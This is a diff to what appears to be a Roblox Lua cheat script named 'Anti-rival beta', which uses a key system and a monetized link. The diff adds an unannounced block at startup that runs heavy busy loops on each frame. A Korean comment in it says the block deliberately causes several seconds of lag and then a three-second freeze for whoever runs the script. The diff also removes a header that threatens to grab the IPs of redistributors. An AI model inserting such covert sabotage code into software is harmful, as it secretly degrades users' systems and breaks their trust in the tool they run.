@@ -1,5 +1,42 @@
--- [Anti-rival beta v0.1.21 재배포 금지 재배포 시 IP 딸거임]
+local RunService = game:GetService("RunService")
 
+task.spawn(function()
+
+    task.wait(0.1)
+    
+
+    local lagStart = os.clock()
+    local lagConn
+    lagConn = RunService.Heartbeat:Connect(function()
+        if os.clock() - lagStart < 5.0 then
+            local _ = 0
+            for i = 1, 40000000 do
+                _ = _ + i
+            end
+        else
+            lagConn:Disconnect()
+        end
+    end)
+    
+    repeat task.wait() until os.clock() - lagStart >= 3.0
+    
+
+    task.wait(0.1)
+    
+    -- 4. 정확히 3초 동안 화면 멈춤(프리즈) 유발
+    local freezeStart = os.clock()
+    local freezeConn
+    freezeConn = RunService.Heartbeat:Connect(function()
+        if os.clock() - freezeStart < 3.0 then
+            local heavy = 0
+            for i = 1, 15000000 do
+                heavy = heavy + math.sqrt(i)
+            end
+        else
+            freezeConn:Disconnect()
+        end
+    end)
+end)
 local KEY_SYSTEM_ENABLED = true
 local CORRECT_KEY = "ieoAfiuAfuagzsrzguorsziuornfuo1"
 local WORK_INK_URL = "https://link-center.net/8373580/1QODzu8DuANE"
